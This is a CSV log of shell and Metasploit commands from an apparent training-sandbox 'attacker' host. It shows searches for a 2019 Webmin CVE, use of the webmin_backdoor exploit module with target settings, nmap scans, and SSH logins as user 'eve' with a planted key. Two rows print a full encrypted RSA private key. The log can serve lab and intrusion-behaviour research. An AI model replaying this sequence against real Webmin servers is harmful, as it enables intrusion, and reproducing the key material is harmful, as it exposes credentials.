sandbox_id,cmd_type,cmd_name,cmd_arguments,hostname,ip,level,username,timestamp_str,relative_timestamp_str
682,bash-command,mmcli,--help,attacker,10.1.135.83,36,kali,2022-05-04T13:20:37.969Z,1970-01-01T00:40:22.887Z
682,bash-command,msfcli,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:20:41.173Z,1970-01-01T00:40:26.091Z
682,bash-command,msfcli,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:20:43.110Z,1970-01-01T00:40:28.028Z
682,bash-command,msfcli,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:21:13.639Z,1970-01-01T00:40:58.557Z
682,bash-command,msfcli,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:21:13.774Z,1970-01-01T00:40:58.692Z
682,msf-command,search,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:21:29.729Z,1970-01-01T00:41:14.647Z
682,msf-command,search,cve:2019,attacker,10.1.135.83,36,null,2022-05-04T13:21:57.357Z,1970-01-01T00:41:42.275Z
682,msf-command,search,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:22:01.983Z,1970-01-01T00:41:46.901Z
682,msf-command,search,-h,attacker,10.1.135.83,36,null,2022-05-04T13:22:08.475Z,1970-01-01T00:41:53.393Z
682,msf-command,search,cve:2019 name:webmin,attacker,10.1.135.83,36,null,2022-05-04T13:22:45.779Z,1970-01-01T00:42:30.697Z
682,msf-command,search,cve:2019 name:webmin,attacker,10.1.135.83,36,null,2022-05-04T13:23:08.293Z,1970-01-01T00:42:53.211Z
682,msf-command,run,exploit/linux/http/webmin_backdoor,attacker,10.1.135.83,36,null,2022-05-04T13:23:30.405Z,1970-01-01T00:43:15.323Z
682,msf-command,use,exploit/linux/http/webmin_backdoor,attacker,10.1.135.83,36,null,2022-05-04T13:23:46.872Z,1970-01-01T00:43:31.790Z
682,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:24:05.976Z,1970-01-01T00:43:50.894Z
682,msf-command,search,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:24:18.012Z,1970-01-01T00:44:02.930Z
682,msf-command,search,cve:2019 name:webmin,attacker,10.1.135.83,36,null,2022-05-04T13:24:25.136Z,1970-01-01T00:44:10.054Z
682,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:24:57.606Z,1970-01-01T00:44:42.524Z
682,msf-command,search,cve:2019 name:webmin,attacker,10.1.135.83,36,null,2022-05-04T13:25:25.271Z,1970-01-01T00:45:10.189Z
682,msf-command,use,exploit/linux/http/webmin_backdoor,attacker,10.1.135.83,36,null,2022-05-04T13:25:40.068Z,1970-01-01T00:45:24.986Z
682,msf-command,hello,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:25:51.472Z,1970-01-01T00:45:36.390Z
682,msf-command,?,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:25:56.589Z,1970-01-01T00:45:41.507Z
682,msf-command,options,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:26:42.155Z,1970-01-01T00:46:27.073Z
682,msf-command,options,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:26:55.855Z,1970-01-01T00:46:40.773Z
682,msf-command,exit,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:27:18.200Z,1970-01-01T00:47:03.118Z
682,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T13:27:18.236Z,1970-01-01T00:47:03.154Z
682,msf-command,use, exploit/unix/webapp/webmin_backdoor,attacker,10.1.135.83,36,null,2022-05-04T13:27:43.539Z,1970-01-01T00:47:28.457Z
682,msf-command,options,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:27:51.279Z,1970-01-01T00:47:36.197Z
682,msf-command,RHOSTS=172.18.1.5,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:28:20.326Z,1970-01-01T00:48:05.244Z
682,msf-command,set,RHOSTS=172.18.1.5,attacker,10.1.135.83,36,null,2022-05-04T13:28:29.339Z,1970-01-01T00:48:14.257Z
682,msf-command,set,RHOSTS 172.18.1.5,attacker,10.1.135.83,36,null,2022-05-04T13:28:34.443Z,1970-01-01T00:48:19.361Z
682,msf-command,options,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:28:35.978Z,1970-01-01T00:48:20.896Z
682,msf-command,exploit,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:28:58.769Z,1970-01-01T00:48:43.687Z
682,msf-command,show,info,attacker,10.1.135.83,36,null,2022-05-04T13:30:05.754Z,1970-01-01T00:49:50.672Z
682,msf-command,show,targets,attacker,10.1.135.83,36,null,2022-05-04T13:30:25.343Z,1970-01-01T00:50:10.261Z
682,msf-command,show,options,attacker,10.1.135.83,36,null,2022-05-04T13:30:47.747Z,1970-01-01T00:50:32.665Z
682,msf-command,set,LHOST 172.18.1.5,attacker,10.1.135.83,36,null,2022-05-04T13:31:01.923Z,1970-01-01T00:50:46.841Z
682,msf-command,exploit,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:31:11.517Z,1970-01-01T00:50:56.435Z
682,msf-command,set,LHOST localhost,attacker,10.1.135.83,36,null,2022-05-04T13:32:19.885Z,1970-01-01T00:52:04.803Z
682,msf-command,exploit,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:32:30.414Z,1970-01-01T00:52:15.332Z
682,msf-command,ifconfig,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:33:01.581Z,1970-01-01T00:52:46.499Z
682,msf-command,set,LHOST eth0,attacker,10.1.135.83,36,null,2022-05-04T13:33:08.841Z,1970-01-01T00:52:53.759Z
682,msf-command,ifconfig,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:33:11.786Z,1970-01-01T00:52:56.704Z
682,msf-command,set,LHOST localhost,attacker,10.1.135.83,36,null,2022-05-04T13:33:15.080Z,1970-01-01T00:52:59.998Z
682,msf-command,set,LHOST eth0,attacker,10.1.135.83,36,null,2022-05-04T13:33:18.639Z,1970-01-01T00:53:03.557Z
682,msf-command,exploit,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:33:32.083Z,1970-01-01T00:53:17.001Z
682,msf-command,ifconfig,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:33:36.523Z,1970-01-01T00:53:21.441Z
682,msf-command,set,LHOST eth1,attacker,10.1.135.83,36,null,2022-05-04T13:33:41.271Z,1970-01-01T00:53:26.189Z
682,bash-command,ssh,eth1:4444,attacker,10.1.135.83,36,kali,2022-05-04T13:35:13.472Z,1970-01-01T00:54:58.390Z
682,bash-command,ssh,10.1.135.83:4444,attacker,10.1.135.83,36,kali,2022-05-04T13:35:25.165Z,1970-01-01T00:55:10.083Z
682,bash-command,ssh,10.1.135.83,attacker,10.1.135.83,36,kali,2022-05-04T13:35:36.583Z,1970-01-01T00:55:21.501Z
682,bash-command,ssh,-p 4444 10.1.135.83,attacker,10.1.135.83,36,kali,2022-05-04T13:35:43.154Z,1970-01-01T00:55:28.072Z
682,msf-command,exploit,NONE,attacker,10.1.135.83,36,null,2022-05-04T13:42:59.389Z,1970-01-01T01:02:44.307Z
682,msf-command,exploit,NONE,attacker,10.1.135.83,37,null,2022-05-04T13:46:16.630Z,1970-01-01T01:06:01.548Z
682,msf-command,exploit,NONE,attacker,10.1.135.83,37,null,2022-05-04T13:48:19.595Z,1970-01-01T01:08:04.513Z
682,bash-command,ssh,-p 4444 10.1.135.83,attacker,10.1.135.83,37,kali,2022-05-04T13:48:45.105Z,1970-01-01T01:08:30.023Z
682,bash-command,ssh,-p 4444 10.1.135.83,attacker,10.1.135.83,37,kali,2022-05-04T13:48:45.687Z,1970-01-01T01:08:30.605Z
682,bash-command,ssh,-p 4444 10.1.135.83,attacker,10.1.135.83,37,kali,2022-05-04T13:48:45.802Z,1970-01-01T01:08:30.720Z
682,bash-command,ll,NONE,attacker,10.1.135.83,37,kali,2022-05-04T13:48:46.337Z,1970-01-01T01:08:31.255Z
682,bash-command,nmap,-sn 172.18.1.5/24,attacker,10.1.135.83,37,kali,2022-05-04T13:49:00.882Z,1970-01-01T01:08:45.800Z
682,bash-command,nmap,-v -A 172.18.1.1,attacker,10.1.135.83,37,kali,2022-05-04T13:49:25.069Z,1970-01-01T01:09:09.987Z
682,bash-command,nmap,-v -A 172.18.1.1,attacker,10.1.135.83,38,kali,2022-05-04T13:55:56.812Z,1970-01-01T01:15:41.730Z
682,bash-command,nmap,-v -A 172.18.1.1,attacker,10.1.135.83,38,kali,2022-05-04T13:55:56.959Z,1970-01-01T01:15:41.877Z
682,bash-command,nmap,-v -A 172.18.1.1,attacker,10.1.135.83,38,kali,2022-05-04T13:55:57.119Z,1970-01-01T01:15:42.037Z
682,bash-command,nmap,-v -A 172.18.1.1,attacker,10.1.135.83,38,kali,2022-05-04T13:55:57.241Z,1970-01-01T01:15:42.159Z
682,bash-command,nmap,-v -A 172.18.1.1,attacker,10.1.135.83,38,kali,2022-05-04T13:55:57.370Z,1970-01-01T01:15:42.288Z
682,bash-command,ll,NONE,attacker,10.1.135.83,38,kali,2022-05-04T13:55:58.444Z,1970-01-01T01:15:43.362Z
682,bash-command,mkdir,.ssh,attacker,10.1.135.83,38,kali,2022-05-04T13:56:02.371Z,1970-01-01T01:15:47.289Z
682,bash-command,cd,.ssh,attacker,10.1.135.83,38,kali,2022-05-04T13:56:06.851Z,1970-01-01T01:15:51.769Z
682,bash-command,ll,NONE,attacker,10.1.135.83,38,kali,2022-05-04T13:56:07.356Z,1970-01-01T01:15:52.274Z
682,bash-command,vim,id_rsa,attacker,10.1.135.83,38,kali,2022-05-04T13:56:19.812Z,1970-01-01T01:16:04.730Z
682,bash-command,vim,id_rsa,attacker,10.1.135.83,38,kali,2022-05-04T13:56:20.426Z,1970-01-01T01:16:05.344Z
682,bash-command,vim,id_rsa,attacker,10.1.135.83,38,kali,2022-05-04T13:56:20.547Z,1970-01-01T01:16:05.465Z
682,bash-command,vim,id_rsa,attacker,10.1.135.83,38,kali,2022-05-04T13:56:20.671Z,1970-01-01T01:16:05.589Z
682,bash-command,ll,NONE,attacker,10.1.135.83,38,kali,2022-05-04T13:56:21.739Z,1970-01-01T01:16:06.657Z
682,bash-command,ssh,-i ~/.ssh/id_rsa eve@10.1.17.4,attacker,10.1.135.83,38,kali,2022-05-04T13:57:13.003Z,1970-01-01T01:16:57.921Z
682,bash-command,chmod,400 ~/.ssh/id_rsa,attacker,10.1.135.83,38,kali,2022-05-04T13:57:20.254Z,1970-01-01T01:17:05.172Z
682,bash-command,chmod,400 ~/.ssh/id_rsa,attacker,10.1.135.83,38,kali,2022-05-04T13:57:20.918Z,1970-01-01T01:17:05.836Z
682,bash-command,chmod,400 ~/.ssh/id_rsa,attacker,10.1.135.83,38,kali,2022-05-04T13:57:21.064Z,1970-01-01T01:17:05.982Z
682,bash-command,ssh,-i ~/.ssh/id_rsa eve@10.1.17.4,attacker,10.1.135.83,38,kali,2022-05-04T13:57:26.687Z,1970-01-01T01:17:11.605Z
682,msf-command,exploit,NONE,attacker,10.1.135.83,38,null,2022-05-04T13:58:22.904Z,1970-01-01T01:18:07.822Z
682,msf-command,pq5zI0lH1Vf4jlhYpD/PXMmULzR28OIOVrkcUeZPVlv+aIpLd6zbe8mfI...,NONE,attacker,10.1.135.83,38,null,2022-05-04T13:58:23.148Z,1970-01-01T01:18:08.066Z
682,msf-command,Q9Z2LPIWU200w5daHsXp/qukKdDn1CB4JinKvtLka3Q4i6EHj+Vp7bvhm...,NONE,attacker,10.1.135.83,38,null,2022-05-04T13:58:23.355Z,1970-01-01T01:18:08.273Z
682,msf-command,/BXnD+JMm+w9ZTRsHqrXKsAEyVhM99hWoFz2k1s+Q003y/7I/0XmPETD4...,NONE,attacker,10.1.135.83,38,null,2022-05-04T13:58:23.462Z,1970-01-01T01:18:08.380Z
682,msf-command,WzolChBDCjWIMZ/9j5JREtzWX3s7+k32TFws/jPKzXEB21M2Szn23pkoX...,NONE,attacker,10.1.135.83,38,null,2022-05-04T13:58:23.573Z,1970-01-01T01:18:08.491Z
682,msf-command,bTXmV+hQf+gS7PjVRthqPONau6on19uDDVXNeuVygP4T8H5v6kAurFVX1...,NONE,attacker,10.1.135.83,38,null,2022-05-04T13:58:23.680Z,1970-01-01T01:18:08.598Z
682,msf-command,sCLJmNBb/7o7QR1Hhvo7NN1z85CJr9yxC6MqLbbcv91Mhb3w1Ce2eL+Qn...,NONE,attacker,10.1.135.83,38,null,2022-05-04T13:58:23.786Z,1970-01-01T01:18:08.704Z
682,msf-command,I0lvTSHTPFgvw00pV4bypACc28X+0YjRVRFOxqZxidw256pubOjRjIHIG...,NONE,attacker,10.1.135.83,38,null,2022-05-04T13:58:23.906Z,1970-01-01T01:18:08.824Z
682,msf-command,W3XiLqeGN7DLwY8X6RXfqafVQmJR6j3zB/PAoSVh25eTQwl2i1rgYzo0I...,NONE,attacker,10.1.135.83,38,null,2022-05-04T13:58:24.129Z,1970-01-01T01:18:09.047Z
682,msf-command,KHGCl8kHWe7ks3KT4+WU9uZZAhAECaWJvLzo2Ba6dst/Ke7KEtmGwv5Ex...,NONE,attacker,10.1.135.83,38,null,2022-05-04T13:58:24.263Z,1970-01-01T01:18:09.181Z
682,msf-command,0mt+olWJFSJa072UPuHe7gWdlexqh0l59q4ohOG+zJke1u74Br9wo6KIv...,NONE,attacker,10.1.135.83,38,null,2022-05-04T13:58:24.371Z,1970-01-01T01:18:09.289Z
682,msf-command,y2O0rVCjsin3d2h9F0Fp0Xvc3EHZD7ct2HvZEV6x3kUlfdWeHKuF+7wUe...,NONE,attacker,10.1.135.83,38,null,2022-05-04T13:58:24.475Z,1970-01-01T01:18:09.393Z
682,msf-command,9+LnogQTclKAVk8htnrxBQh7aPLBAyTaXACAL31bB0ZXfh0yhJX6bXIe+...,NONE,attacker,10.1.135.83,38,null,2022-05-04T13:58:24.592Z,1970-01-01T01:18:09.510Z
682,bash-command,ssh,-i ~/.ssh/id_rsa eve@10.1.17.4,attacker,10.1.135.83,38,kali,2022-05-04T13:59:28.291Z,1970-01-01T01:19:13.209Z
682,bash-command,ssh,-i ~/.ssh/id_rsa eve@10.1.17.4,attacker,10.1.135.83,38,kali,2022-05-04T13:59:28.417Z,1970-01-01T01:19:13.335Z
682,bash-command,ll,NONE,attacker,10.1.135.83,38,kali,2022-05-04T13:59:28.876Z,1970-01-01T01:19:13.794Z
682,bash-command,rm,-f id_rsa,attacker,10.1.135.83,38,kali,2022-05-04T13:59:36.444Z,1970-01-01T01:19:21.362Z
682,bash-command,ll,NONE,attacker,10.1.135.83,38,kali,2022-05-04T13:59:37.114Z,1970-01-01T01:19:22.032Z
682,bash-command,vim,NONE,attacker,10.1.135.83,38,kali,2022-05-04T13:59:49.311Z,1970-01-01T01:19:34.229Z
682,bash-command,vim,NONE,attacker,10.1.135.83,38,kali,2022-05-04T13:59:51.069Z,1970-01-01T01:19:35.987Z
682,bash-command,vim,NONE,attacker,10.1.135.83,38,kali,2022-05-04T13:59:51.199Z,1970-01-01T01:19:36.117Z
682,bash-command,vim,NONE,attacker,10.1.135.83,38,kali,2022-05-04T13:59:51.326Z,1970-01-01T01:19:36.244Z
682,bash-command,echo,(quote)-----BEGIN RSA PRIVATE KEY-----(newline)(newline)Proc-Type: 4(comma)ENCRYPTED(newline)(newline)DEK-Info: AES-128-CBC(comma)48A98AC639005A4158AA7B9CEEF483C4(newline)(newline)(newline)(newline)Ps9uCxB/vjzzEwZU+BjohF/sb/kaa+thfeYki9iFGqVQpHbPhdZU7JO2rKTU3w4k(newline)(newline)2OG1q9DAD07fQPpCmX5vqWAdmeaWq//2k3zRVsadFF3daPGjWs1f61j4/JqYBSDl(newline)(newline)yeX8g98mtBLBas7bUFuo4jVroEUaoF0fpa0Up+mOAC3rY3tsprpfofQu+uoXaRRJ(newline)(newline)Bq2CuS5LcqbfVfl9737XeC+DNls/AmkLmYU/1NLKp1hWSpx0/dfJu725tDOtR6zB(newline)(newline)9lS9eEPebv4V8mUNU+bsh5YQbVrVmryO9BRLBl4ZK82SO7tnyObpWfsa2jLGg4Mp(newline)(newline)N/jFdUnWSkA2wEgzupDZmPU6jyJ/BosOxJVkih4oQB1s9BO+HzI7oA5sDfO/gw1R(newline)(newline)BdC2V8RnF8i8gwppc2eenbU/PIdDTu6M2LTO4aAM5wxwKXgkTdJuUxmNH4DCFgZ+(newline)(newline)/DJyNP3xqCknFLIVTBwVSsHqnHSN6ZCl8BteFdRsf6kAj6qm1/cAfL73otlGZyR7(newline)(newline)5PHI1jf+WoJVaRKQLzFfaMrY0rhU6TsQTYdm2QYcSszE1fhLdXGNKpathYz1sUhe(newline)(newline)RPbgJfB0PuzwpzcKesh5j+AnjKQjZcG1vHnrgvDFnd5VNOOrTzdUnMA0DwwVwm2S(newline)(newline)vkjUvPbdIkQlNuBL0FWZl/2vHf/xWWex4Q0plLf7lRWJsCDtiKflKHL/SBFYVy0F(newline)(newline)TwKMZJ4885lBJfN3AG9kj4azCLK6IcAuRoxTmAtYrntQWLtDCHyaCW6dZItCtQK2(newline)(newline)pghYqk7inYawVLDG9f5ej+1MYQNfScZYpQ/IEH2jfbRgQsXj7zgtS9ewQoyqBY2o(newline)(newline)TC+mWTFkXW5YlN9Bu1uZ2CgYQJF0Dx1ns5x3IeF+U5z56KRqaKFJPfRQgTg62m7e(newline)(newline)0v/8aKPlPwfmS28OtxtE96zQI3SAAy7AdwkBepz5Pk9iotqIQPk5fY68wBG67v+a(newline)(newline)d712Dnn4OPYaqzMTyWz/dRiWcax9bFhNV+9Gp1OoA7hhBO5daLoul3EYx54vd8N3(newline)(newline)qJkjc4ljMYr9wvRRcWEhlvQV6LTk2FiYOY4tjRneLXMfsb2BUwSFDXDwDL4zVF5X(newline)(newline)rk6oUkbp2aFy5SgMwdlm6tc5sHVHVOLTfeyv7AvRUOaGXbbrUBw1rxgswjSO4V5q(newline)(newline)anC3ZW1EHY/nUmSq9myKG5rPdgFhqx7lPBb5eXSGcA+rFkxkQwbtROw73mu00IXl(newline)(newline)FKuYCbpmfnY0ZBxR9NVh/kRpv5VI013Mwqk2lcuJTc+mjlHOymyXAhY02j218KSm(newline)(newline)TleEMFlW9oXD56B21kVdPDP9McdLgC9//2pSh8sI5kJEsNd294g8ju/dDNC5kybN(newline)(newline)aqa9d+Nsbodr90LgBOFRdtxUeYihXLS2ZfXE5wYfTwX17ZIoFLuYamE6Og7AllVL(newline)(newline)uSoF68eAZXd6R9bL03s9HQvGkSZv8zaFlmK4wRVI5frYMlU5gzD5E/e6Id5X7uCQ(newline)(newline)pq5zI0lH1Vf4jlhYpD/PXMmULzR28OIOVrkcUeZPVlv+aIpLd6zbe8mfIEDCzH9G(newline)(newline)Q9Z2LPIWU200w5daHsXp/qukKdDn1CB4JinKvtLka3Q4i6EHj+Vp7bvhmFpapjdW(newline)(newline)/BXnD+JMm+w9ZTRsHqrXKsAEyVhM99hWoFz2k1s+Q003y/7I/0XmPETD4GJZAfqX(newline)(newline)WzolChBDCjWIMZ/9j5JREtzWX3s7+k32TFws/jPKzXEB21M2Szn23pkoXp+zyqT6(newline)(newline)bTXmV+hQf+gS7PjVRthqPONau6on19uDDVXNeuVygP4T8H5v6kAurFVX1rvkbaSm(newline)(newline)sCLJmNBb/7o7QR1Hhvo7NN1z85CJr9yxC6MqLbbcv91Mhb3w1Ce2eL+QnhgE86HE(newline)(newline)I0lvTSHTPFgvw00pV4bypACc28X+0YjRVRFOxqZxidw256pubOjRjIHIG5n6eMYk(newline)(newline)W3XiLqeGN7DLwY8X6RXfqafVQmJR6j3zB/PAoSVh25eTQwl2i1rgYzo0IGcdwUxN(newline)(newline)KHGCl8kHWe7ks3KT4+WU9uZZAhAECaWJvLzo2Ba6dst/Ke7KEtmGwv5ExUUvfHve(newline)(newline)0mt+olWJFSJa072UPuHe7gWdlexqh0l59q4ohOG+zJke1u74Br9wo6KIv54IqGVS(newline)(newline)y2O0rVCjsin3d2h9F0Fp0Xvc3EHZD7ct2HvZEV6x3kUlfdWeHKuF+7wUeTJfSmvq(newline)(newline)9+LnogQTclKAVk8htnrxBQh7aPLBAyTaXACAL31bB0ZXfh0yhJX6bXIe+EVPNaf6(newline)(newline)rJf/WLYf6/Lmfgv/ECF+VqdLPGkLT8dEgrajh9t2TaoU+/+mxtGXaJ7Iea9I+g9l(newline)(newline)22unE+jCDSQMF9IygWb8HfzBsruZ7IQ+/h7g7XDpEZrJf6+mdmbzBXLwlnnD1XG3(newline)(newline)FEJ08UNnUQsuqoD+vPxunBwkFv5b/5yt0XMu9tZdXk9AW9BdasCIE1bY+au0cnTX(newline)(newline)rjmFQ+KmCqH5lReI0Ai3fJ8pnZ2D3/m7AV/1llNaijp9NmriqK0jiVBpnEM+uH3a(newline)(newline)WtUQOqd4QS2S8MwjPoBZ0hpXOY0JX95EvWhp58uOy0/o8yYSbb+bZe7g0+MJuF9R(newline)(newline)Rj6xI5CiBdDo83VdQHlyaUawTlv/wUpqSRc9xsK/y2dLjzQhAD+QkWbm98jrcAGX(newline)(newline)Tlqk1XDm0e9sNcXus5d5pnTWeCH4bnwnQDo0Ot/KljNmnG11/FXuPFnAToOq52Az(newline)(newline)SqV4xTHhlfTZQcjVD+Rc44JkIFTr2gzDvcLOOMwcBf232/ySokL9xuMlLVc04Jy2(newline),attacker,10.1.135.83,38,kali,2022-05-04T13:59:56.740Z,1970-01-01T01:19:41.658Z
682,bash-command,echo,(quote)-----BEGIN RSA PRIVATE KEY-----(newline)(newline)Proc-Type: 4(comma)ENCRYPTED(newline)(newline)DEK-Info: AES-128-CBC(comma)48A98AC639005A4158AA7B9CEEF483C4(newline)(newline)(newline)(newline)Ps9uCxB/vjzzEwZU+BjohF/sb/kaa+thfeYki9iFGqVQpHbPhdZU7JO2rKTU3w4k(newline)(newline)2OG1q9DAD07fQPpCmX5vqWAdmeaWq//2k3zRVsadFF3daPGjWs1f61j4/JqYBSDl(newline)(newline)yeX8g98mtBLBas7bUFuo4jVroEUaoF0fpa0Up+mOAC3rY3tsprpfofQu+uoXaRRJ(newline)(newline)Bq2CuS5LcqbfVfl9737XeC+DNls/AmkLmYU/1NLKp1hWSpx0/dfJu725tDOtR6zB(newline)(newline)9lS9eEPebv4V8mUNU+bsh5YQbVrVmryO9BRLBl4ZK82SO7tnyObpWfsa2jLGg4Mp(newline)(newline)N/jFdUnWSkA2wEgzupDZmPU6jyJ/BosOxJVkih4oQB1s9BO+HzI7oA5sDfO/gw1R(newline)(newline)BdC2V8RnF8i8gwppc2eenbU/PIdDTu6M2LTO4aAM5wxwKXgkTdJuUxmNH4DCFgZ+(newline)(newline)/DJyNP3xqCknFLIVTBwVSsHqnHSN6ZCl8BteFdRsf6kAj6qm1/cAfL73otlGZyR7(newline)(newline)5PHI1jf+WoJVaRKQLzFfaMrY0rhU6TsQTYdm2QYcSszE1fhLdXGNKpathYz1sUhe(newline)(newline)RPbgJfB0PuzwpzcKesh5j+AnjKQjZcG1vHnrgvDFnd5VNOOrTzdUnMA0DwwVwm2S(newline)(newline)vkjUvPbdIkQlNuBL0FWZl/2vHf/xWWex4Q0plLf7lRWJsCDtiKflKHL/SBFYVy0F(newline)(newline)TwKMZJ4885lBJfN3AG9kj4azCLK6IcAuRoxTmAtYrntQWLtDCHyaCW6dZItCtQK2(newline)(newline)pghYqk7inYawVLDG9f5ej+1MYQNfScZYpQ/IEH2jfbRgQsXj7zgtS9ewQoyqBY2o(newline)(newline)TC+mWTFkXW5YlN9Bu1uZ2CgYQJF0Dx1ns5x3IeF+U5z56KRqaKFJPfRQgTg62m7e(newline)(newline)0v/8aKPlPwfmS28OtxtE96zQI3SAAy7AdwkBepz5Pk9iotqIQPk5fY68wBG67v+a(newline)(newline)d712Dnn4OPYaqzMTyWz/dRiWcax9bFhNV+9Gp1OoA7hhBO5daLoul3EYx54vd8N3(newline)(newline)qJkjc4ljMYr9wvRRcWEhlvQV6LTk2FiYOY4tjRneLXMfsb2BUwSFDXDwDL4zVF5X(newline)(newline)rk6oUkbp2aFy5SgMwdlm6tc5sHVHVOLTfeyv7AvRUOaGXbbrUBw1rxgswjSO4V5q(newline)(newline)anC3ZW1EHY/nUmSq9myKG5rPdgFhqx7lPBb5eXSGcA+rFkxkQwbtROw73mu00IXl(newline)(newline)FKuYCbpmfnY0ZBxR9NVh/kRpv5VI013Mwqk2lcuJTc+mjlHOymyXAhY02j218KSm(newline)(newline)TleEMFlW9oXD56B21kVdPDP9McdLgC9//2pSh8sI5kJEsNd294g8ju/dDNC5kybN(newline)(newline)aqa9d+Nsbodr90LgBOFRdtxUeYihXLS2ZfXE5wYfTwX17ZIoFLuYamE6Og7AllVL(newline)(newline)uSoF68eAZXd6R9bL03s9HQvGkSZv8zaFlmK4wRVI5frYMlU5gzD5E/e6Id5X7uCQ(newline)(newline)pq5zI0lH1Vf4jlhYpD/PXMmULzR28OIOVrkcUeZPVlv+aIpLd6zbe8mfIEDCzH9G(newline)(newline)Q9Z2LPIWU200w5daHsXp/qukKdDn1CB4JinKvtLka3Q4i6EHj+Vp7bvhmFpapjdW(newline)(newline)/BXnD+JMm+w9ZTRsHqrXKsAEyVhM99hWoFz2k1s+Q003y/7I/0XmPETD4GJZAfqX(newline)(newline)WzolChBDCjWIMZ/9j5JREtzWX3s7+k32TFws/jPKzXEB21M2Szn23pkoXp+zyqT6(newline)(newline)bTXmV+hQf+gS7PjVRthqPONau6on19uDDVXNeuVygP4T8H5v6kAurFVX1rvkbaSm(newline)(newline)sCLJmNBb/7o7QR1Hhvo7NN1z85CJr9yxC6MqLbbcv91Mhb3w1Ce2eL+QnhgE86HE(newline)(newline)I0lvTSHTPFgvw00pV4bypACc28X+0YjRVRFOxqZxidw256pubOjRjIHIG5n6eMYk(newline)(newline)W3XiLqeGN7DLwY8X6RXfqafVQmJR6j3zB/PAoSVh25eTQwl2i1rgYzo0IGcdwUxN(newline)(newline)KHGCl8kHWe7ks3KT4+WU9uZZAhAECaWJvLzo2Ba6dst/Ke7KEtmGwv5ExUUvfHve(newline)(newline)0mt+olWJFSJa072UPuHe7gWdlexqh0l59q4ohOG+zJke1u74Br9wo6KIv54IqGVS(newline)(newline)y2O0rVCjsin3d2h9F0Fp0Xvc3EHZD7ct2HvZEV6x3kUlfdWeHKuF+7wUeTJfSmvq(newline)(newline)9+LnogQTclKAVk8htnrxBQh7aPLBAyTaXACAL31bB0ZXfh0yhJX6bXIe+EVPNaf6(newline)(newline)rJf/WLYf6/Lmfgv/ECF+VqdLPGkLT8dEgrajh9t2TaoU+/+mxtGXaJ7Iea9I+g9l(newline)(newline)22unE+jCDSQMF9IygWb8HfzBsruZ7IQ+/h7g7XDpEZrJf6+mdmbzBXLwlnnD1XG3(newline)(newline)FEJ08UNnUQsuqoD+vPxunBwkFv5b/5yt0XMu9tZdXk9AW9BdasCIE1bY+au0cnTX(newline)(newline)rjmFQ+KmCqH5lReI0Ai3fJ8pnZ2D3/m7AV/1llNaijp9NmriqK0jiVBpnEM+uH3a(newline)(newline)WtUQOqd4QS2S8MwjPoBZ0hpXOY0JX95EvWhp58uOy0/o8yYSbb+bZe7g0+MJuF9R(newline)(newline)Rj6xI5CiBdDo83VdQHlyaUawTlv/wUpqSRc9xsK/y2dLjzQhAD+QkWbm98jrcAGX(newline)(newline)Tlqk1XDm0e9sNcXus5d5pnTWeCH4bnwnQDo0Ot/KljNmnG11/FXuPFnAToOq52Az(newline)(newline)SqV4xTHhlfTZQcjVD+Rc44JkIFTr2gzDvcLOOMwcBf232/ySokL9xuMlLVc04Jy2(newline),attacker,10.1.135.83,38,kali,2022-05-04T13:59:56.944Z,1970-01-01T01:19:41.862Z
